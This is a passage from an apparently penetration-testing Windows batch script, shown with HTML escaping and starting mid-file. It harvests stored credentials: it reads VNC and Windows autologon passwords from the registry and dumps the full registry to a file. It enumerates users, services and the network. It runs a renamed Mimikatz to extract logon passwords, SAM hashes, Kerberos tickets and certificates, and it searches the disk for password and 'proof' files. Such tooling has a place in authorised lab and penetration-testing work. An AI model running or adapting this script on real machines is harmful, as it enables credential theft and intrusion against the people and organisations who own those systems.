&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Adobe\Common\10\Sites&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set DREAMWEAVERfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set GMAILDESKTOPfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\DownloadManager\Passwords&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set IDMfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKCU\SOFTWARE\Google\Picasa&amp;quot; 1&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set PICASAfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\SOFTWARE\RealVNC\vncserver &#x2F;v Password | Find &amp;quot;Password&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set realvncpassfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\Software\TightVNC\Server &#x2F;v Password | Find &amp;quot;Password&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set tightvncpassfound1=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\Software\TightVNC\Server &#x2F;v PasswordViewOnly | Find &amp;quot;PasswordViewOnly&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set tightvncpassfound2=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\Software\TigerVNC\WinVNC4 &#x2F;v Password | Find &amp;quot;Password&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set tigervncpassfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\SOFTWARE\ORL\WinVNC3\Default &#x2F;v Password | Find &amp;quot;Password&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set vnc3passfound1=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM\SOFTWARE\ORL\WinVNC3 &#x2F;v Password | Find &amp;quot;Password&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set vnc3passfound2=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKCU\Software\ORL\WinVNC3 &#x2F;v Password | Find &amp;quot;Password&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set vnc3passfound3=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultPassword | Find &amp;quot;DefaultPassword&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (
&lt;&#x2F;span&gt;&lt;span&gt;	For &#x2F;F &amp;quot;Tokens=2*&amp;quot; %%a In (&amp;#39;reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultPassword&amp;#39;) Do set defaultloginpass=%%b	
&lt;&#x2F;span&gt;&lt;span&gt;	REM we check if the registry key is not null
&lt;&#x2F;span&gt;&lt;span&gt;	IF NOT [%defaultloginpass%] == [] set winautologinpassfound=1
&lt;&#x2F;span&gt;&lt;span&gt;	set defaultloginpass=
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultUsername | Find &amp;quot;DefaultUsername&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set winautologinuserfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultDomainname | Find &amp;quot;DefaultDomainname&amp;quot; 1&amp;gt; NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 0 (set winautologindomainfound=1)
&lt;&#x2F;span&gt;&lt;span&gt;REM
&lt;&#x2F;span&gt;&lt;span&gt;REM
&lt;&#x2F;span&gt;&lt;span&gt;echo ====================== IGNORE THESE ERRORS =========================
&lt;&#x2F;span&gt;&lt;span&gt;echo ====================================================================
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:CheckOSVersion
&lt;&#x2F;span&gt;&lt;span&gt;@echo off
&lt;&#x2F;span&gt;&lt;span&gt;ver | find &amp;quot;2003&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_2003
&lt;&#x2F;span&gt;&lt;span&gt;ver | find &amp;quot;XP&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_xp
&lt;&#x2F;span&gt;&lt;span&gt;ver | find &amp;quot;2000&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_2000
&lt;&#x2F;span&gt;&lt;span&gt;ver | find &amp;quot;NT&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_nt
&lt;&#x2F;span&gt;&lt;span&gt;if not exist %SystemRoot%\system32\systeminfo.exe goto versioncheckwarnthenexit
&lt;&#x2F;span&gt;&lt;span&gt;systeminfo | find &amp;quot;OS Name&amp;quot; &amp;gt; %TEMP%\osname.txt
&lt;&#x2F;span&gt;&lt;span&gt;FOR &#x2F;F &amp;quot;usebackq delims=: tokens=2&amp;quot; %%i IN (%TEMP%\osname.txt) DO set vers=%%i
&lt;&#x2F;span&gt;&lt;span&gt;echo %vers% | find &amp;quot;Windows 7&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_7
&lt;&#x2F;span&gt;&lt;span&gt;echo %vers% | find &amp;quot;Windows Server 2008&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_2008
&lt;&#x2F;span&gt;&lt;span&gt;echo %vers% | find &amp;quot;Windows Vista&amp;quot; &amp;gt; nul
&lt;&#x2F;span&gt;&lt;span&gt;if %ERRORLEVEL% == 0 goto ver_vista
&lt;&#x2F;span&gt;&lt;span&gt;goto warnthenexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_7
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows 7 specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WIN7
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_2008
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows Server 2008 specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WIN2008
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_vista
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows Vista specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WINVISTA
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_2003
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows Server 2003 specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WIN2003
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_xp
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows XP specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WINXP
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_2000
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows 2000 specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WIN2000
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:ver_nt
&lt;&#x2F;span&gt;&lt;span&gt;:Run Windows NT specific commands here.
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=WINNT
&lt;&#x2F;span&gt;&lt;span&gt;goto versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:versioncheckwarnthenexit
&lt;&#x2F;span&gt;&lt;span&gt;set OSVersion=UNDETERMINED
&lt;&#x2F;span&gt;&lt;span&gt;goto:versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;:versioncheckexit
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:checkquickwins
&lt;&#x2F;span&gt;&lt;span&gt;	systeminfo &amp;gt; systeminfo.txt
&lt;&#x2F;span&gt;&lt;span&gt;	REM === Generic tests across all Windows versions here
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED alwaysinstallelevated (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! VULNERABLE TO ALWAYSINSTALLELEVATED !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		set alwaysinstallelevated=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED realvncpassfound (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! REALVNC PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKLM\SOFTWARE\RealVNC\vncserver &#x2F;v Password | Find &amp;quot;Password&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo ************************************
&lt;&#x2F;span&gt;&lt;span&gt;		set realvncpassfound=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED tightvncpassfound1 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! TIGHTVNC PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKLM\Software\TightVNC\Server &#x2F;v Password | Find &amp;quot;Password&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo *************************************
&lt;&#x2F;span&gt;&lt;span&gt;		set tightvncpassfound1=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED tightvncpassfound2 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! TIGHTVNC VIEWONLY PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKLM\Software\TightVNC\Server &#x2F;v PasswordViewOnly | Find &amp;quot;PasswordViewOnly&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo **********************************************
&lt;&#x2F;span&gt;&lt;span&gt;		set tightvncpassfound2=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED tigervncpassfound (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! TIGERVNC PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKLM\Software\TigerVNC\WinVNC4 &#x2F;v Password | Find &amp;quot;Password&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo *************************************
&lt;&#x2F;span&gt;&lt;span&gt;		set tigervncpassfound=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED vnc3passfound1 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! VNC3 PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKLM\SOFTWARE\ORL\WinVNC3\Default &#x2F;v Password | Find &amp;quot;Password&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo *********************************
&lt;&#x2F;span&gt;&lt;span&gt;		set vnc3passfound1=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED vnc3passfound2 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! VNC3 PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKLM\SOFTWARE\ORL\WinVNC3 &#x2F;v Password | Find &amp;quot;Password&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo *********************************
&lt;&#x2F;span&gt;&lt;span&gt;		set vnc3passfound2=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED vnc3passfound3 (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! VNC3 PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query HKCU\Software\ORL\WinVNC3 &#x2F;v Password | Find &amp;quot;Password&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo *********************************
&lt;&#x2F;span&gt;&lt;span&gt;		set vnc3passfound3=
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;	IF DEFINED winautologinpassfound (
&lt;&#x2F;span&gt;&lt;span&gt;		echo **** !!! WINDOWS AUTOLOGIN PASS FOUND !!! ****
&lt;&#x2F;span&gt;&lt;span&gt;		reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultPassword | Find &amp;quot;DefaultPassword&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		echo **********************************************
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		IF DEFINED Winautologinuserfound (
&lt;&#x2F;span&gt;&lt;span&gt;			reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultUsername | Find &amp;quot;DefaultUsername&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			set winautologinuserfound=
&lt;&#x2F;span&gt;&lt;span&gt;		)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		IF DEFINED winautologindomainfound (
&lt;&#x2F;span&gt;&lt;span&gt;			reg query &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&amp;quot; &#x2F;v DefaultDomainname | Find &amp;quot;DefaultDomainname&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;			set winautologindomainfound=
&lt;&#x2F;span&gt;&lt;span&gt;		)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;		set winautologinpassfound=
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;	if %OSVersion%==WINXP (
&lt;&#x2F;span&gt;&lt;span&gt;		REM Maybe we can do something nice with this, haven&amp;#39;t found a really good use yet other than it does work, too many KB&amp;#39;s and interdependencies on KB patches
&lt;&#x2F;span&gt;&lt;span&gt;		REM for &#x2F;f &amp;quot;tokens=1 delims=&amp;quot; %%a in (&amp;#39;type systeminfo.txt ^| findstr &#x2F;C:&amp;quot;KB147222&amp;quot;&amp;#39;) do set MYKB=%%a
&lt;&#x2F;span&gt;&lt;span&gt;		REM if NOT DEFINED MYKB echo == VULNERABLE TO KBasfjsdfj
&lt;&#x2F;span&gt;&lt;span&gt;		REM set MYKB=
&lt;&#x2F;span&gt;&lt;span&gt;		REM echo.
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:getfirewallinformation
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;IF DEFINED netshfirewall (
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;		echo.Firewall Status
&lt;&#x2F;span&gt;&lt;span&gt;		echo.---------------
&lt;&#x2F;span&gt;&lt;span&gt;		netsh firewall show state
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;		echo.Firewall configuration details
&lt;&#x2F;span&gt;&lt;span&gt;		echo.------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;		netsh firewall show config
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	) ELSE (
&lt;&#x2F;span&gt;&lt;span&gt;		echo === NOTE: The netsh firewall command was not found, skipping checks ===
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:getcomputerinformation
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.This computer is running %OSbit%-bit Windows
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;IF DEFINED whoami (
&lt;&#x2F;span&gt;&lt;span&gt;	echo.
&lt;&#x2F;span&gt;&lt;span&gt;	echo.Are we running an elevated command prompt?
&lt;&#x2F;span&gt;&lt;span&gt;	echo.------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;	for &#x2F;f &amp;quot;tokens=1 delims=&amp;quot; %%a in (&amp;#39;whoami &#x2F;groups ^| findstr \.*High.Man&amp;#39;) do set runningelevatedprompt=%%a
&lt;&#x2F;span&gt;&lt;span&gt;		IF DEFINED runningelevatedprompt (
&lt;&#x2F;span&gt;&lt;span&gt;				echo YES, we ARE!
&lt;&#x2F;span&gt;&lt;span&gt;			) ELSE (
&lt;&#x2F;span&gt;&lt;span&gt;				echo Sadly, no...
&lt;&#x2F;span&gt;&lt;span&gt;			)
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;		echo.User Groups
&lt;&#x2F;span&gt;&lt;span&gt;		echo.-----------
&lt;&#x2F;span&gt;&lt;span&gt;		whoami &#x2F;groups
&lt;&#x2F;span&gt;&lt;span&gt;		echo.
&lt;&#x2F;span&gt;&lt;span&gt;	) ELSE (
&lt;&#x2F;span&gt;&lt;span&gt;		echo === NOTE: The whoami command was not found, skipping checks ===
&lt;&#x2F;span&gt;&lt;span&gt;	)
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.User Accounts
&lt;&#x2F;span&gt;&lt;span&gt;echo.-------------
&lt;&#x2F;span&gt;&lt;span&gt;net users
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Systeminfo
&lt;&#x2F;span&gt;&lt;span&gt;echo.----------
&lt;&#x2F;span&gt;&lt;span&gt;systeminfo
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Netstat -ano
&lt;&#x2F;span&gt;&lt;span&gt;echo.------------
&lt;&#x2F;span&gt;&lt;span&gt;netstat -ano
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Scheduled tasks
&lt;&#x2F;span&gt;&lt;span&gt;echo.---------------
&lt;&#x2F;span&gt;&lt;span&gt;schtasks &#x2F;query &#x2F;fo LIST &#x2F;v
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Task to service mapping
&lt;&#x2F;span&gt;&lt;span&gt;echo.-----------------------
&lt;&#x2F;span&gt;&lt;span&gt;tasklist &#x2F;SVC
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Network settings
&lt;&#x2F;span&gt;&lt;span&gt;echo.----------------
&lt;&#x2F;span&gt;&lt;span&gt;ipconfig &#x2F;all
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Running windows services
&lt;&#x2F;span&gt;&lt;span&gt;echo.------------------------
&lt;&#x2F;span&gt;&lt;span&gt;net start
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Listing Windows drivers
&lt;&#x2F;span&gt;&lt;span&gt;echo.-----------------------
&lt;&#x2F;span&gt;&lt;span&gt;DRIVERQUERY
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Dumping Windows registry to registrydump.txt
&lt;&#x2F;span&gt;&lt;span&gt;echo.--------------------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKLM &#x2F;s &amp;gt; registrydump.txt
&lt;&#x2F;span&gt;&lt;span&gt;reg query HKCU &#x2F;s &amp;gt;&amp;gt; registrydump.txt
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Environment variables
&lt;&#x2F;span&gt;&lt;span&gt;echo.---------------------
&lt;&#x2F;span&gt;&lt;span&gt;set
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.Group Policy
&lt;&#x2F;span&gt;&lt;span&gt;echo.------------
&lt;&#x2F;span&gt;&lt;span&gt;gpresult &#x2F;R 1&amp;gt;2&amp;gt;NUL
&lt;&#x2F;span&gt;&lt;span&gt;IF %ERRORLEVEL% == 1 (
&lt;&#x2F;span&gt;&lt;span&gt;	REM WINXP
&lt;&#x2F;span&gt;&lt;span&gt;	gpresult
&lt;&#x2F;span&gt;&lt;span&gt;) ELSE (
&lt;&#x2F;span&gt;&lt;span&gt;	REM WIN7
&lt;&#x2F;span&gt;&lt;span&gt;	gpresult &#x2F;R
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;REM ** ALEX TO ADD CREDENUMERATE **
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:dumphashespasseskerberoscerts
&lt;&#x2F;span&gt;&lt;span&gt;echo.Hashes, passwords, kerberos tickets and certificates
&lt;&#x2F;span&gt;&lt;span&gt;echo.-----------------
&lt;&#x2F;span&gt;&lt;span&gt;IF NOT DEFINED jollykatz echo === NOTE: Jollykatz%OSbit%.exe not found, skipping jollykatz checks ===
&lt;&#x2F;span&gt;&lt;span&gt;IF NOT DEFINED jollykatz goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.sekurlsa::logonPasswords full
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::logonPasswords full&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.lsadump::sam
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;token::elevate&amp;quot; &amp;quot;lsadump::sam&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.sekurlsa::tickets &#x2F;export
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;token::elevate&amp;quot; &amp;quot;sekurlsa::tickets &#x2F;export&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.crypto::certificates &#x2F;export (CERT_SYSTEM_STORE_CURRENT_USER)
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;token::elevate&amp;quot; &amp;quot;crypto::capi&amp;quot; &amp;quot;crypto::cng&amp;quot; &amp;quot;crypto::certificates &#x2F;systemstore:CERT_SYSTEM_STORE_CURRENT_USER &#x2F;store:my &#x2F;export&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.crypto::certificates &#x2F;export (CERT_SYSTEM_STORE_LOCAL_MACHINE)
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;token::elevate&amp;quot; &amp;quot;crypto::capi&amp;quot; &amp;quot;crypto::cng&amp;quot; &amp;quot;crypto::certificates &#x2F;systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE &#x2F;store:my &#x2F;export&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.crypto::certificates &#x2F;export (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE)
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;token::elevate&amp;quot; &amp;quot;crypto::capi&amp;quot; &amp;quot;crypto::cng&amp;quot; &amp;quot;crypto::certificates &#x2F;systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE &#x2F;store:my &#x2F;export&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;echo.crypto::certificates &#x2F;export (CERT_SYSTEM_STORE_USERS)
&lt;&#x2F;span&gt;&lt;span&gt;echo.------
&lt;&#x2F;span&gt;&lt;span&gt;jollykatz%OSbit%.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;token::elevate&amp;quot; &amp;quot;crypto::capi&amp;quot; &amp;quot;crypto::cng&amp;quot; &amp;quot;crypto::certificates &#x2F;systemstore:CERT_SYSTEM_STORE_USERS &#x2F;store:my &#x2F;export&amp;quot; &amp;quot;exit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;echo.
&lt;&#x2F;span&gt;&lt;span&gt;goto:eof
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;:findinterestingfiles
&lt;&#x2F;span&gt;&lt;span&gt;echo.Interesting files and directories
&lt;&#x2F;span&gt;&lt;span&gt;echo.---------------------------------
&lt;&#x2F;span&gt;&lt;span&gt;dir C:\* &#x2F;a&#x2F;s&#x2F;b &amp;gt; dirlisting.txt
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*proof[.]txt$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*network-secret[.]txt$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*ssh.*[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*ultravnc[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*vnc[.]ini$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*bthpan[.]sys$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*\\repair$
&lt;&#x2F;span&gt;&lt;span&gt;type dirlisting.txt | findstr &#x2F;I \.*passw*. | findstr &#x2F;VI \.*.chm$ | findstr &#x2F;VI \.*.log$ | findstr &#x2F;VI \.*.dll$ | findstr &#x2F;VI \.*.exe$
